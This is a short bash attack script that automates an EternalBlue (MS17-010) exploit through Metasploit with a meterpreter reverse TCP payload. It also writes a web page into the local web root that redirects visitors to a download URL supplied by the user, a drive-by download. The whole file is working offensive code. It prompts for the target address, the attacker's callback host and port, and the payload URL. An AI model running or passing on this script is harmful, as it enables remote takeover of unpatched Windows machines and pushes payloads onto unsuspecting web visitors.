#!/bin/bash

echo "
 ____                         _    _        ____       _ 
|  _ \ __ _  __ _ ___        / \  | |      / ___|_   _| |
| |_) / _` |/ _` / __|_____ / _ \ | |_____| |  _| | | | |
|  _ < (_| | (_| \__ \_____/ ___ \| |_____| |_| | |_| | |
|_| \_\__,_|\__,_|___/    /_/   \_\_|      \____|\__,_|_|

"

echo "A script to exploit the EternalBlue vulnerability and perform a drive-by download attack."

read -p "Enter the target IP address (RHOSTS): " target_ip
read -p "Enter your local IP address (LHOST): " local_ip
read -p "Enter the port number to use (LPORT): " port
read -p "Enter the URL of the file to download and execute on the target machine: " file_url

cat <<EOL > /var/www/html/index.html
<html>
<head>
    <title>Drive-By Download Test</title>
</head>
<body>
    <h1>Test Page</h1>
    <p>If this page loads, the file will be automatically downloaded.</p>
    <script type="text/javascript">
        window.location.href = "$file_url";
    </script>
</body>
</html>
EOL

msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $target_ip;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
set LHOST $local_ip;
set LPORT $port;
exploit;
sessions -i 1;
exit;"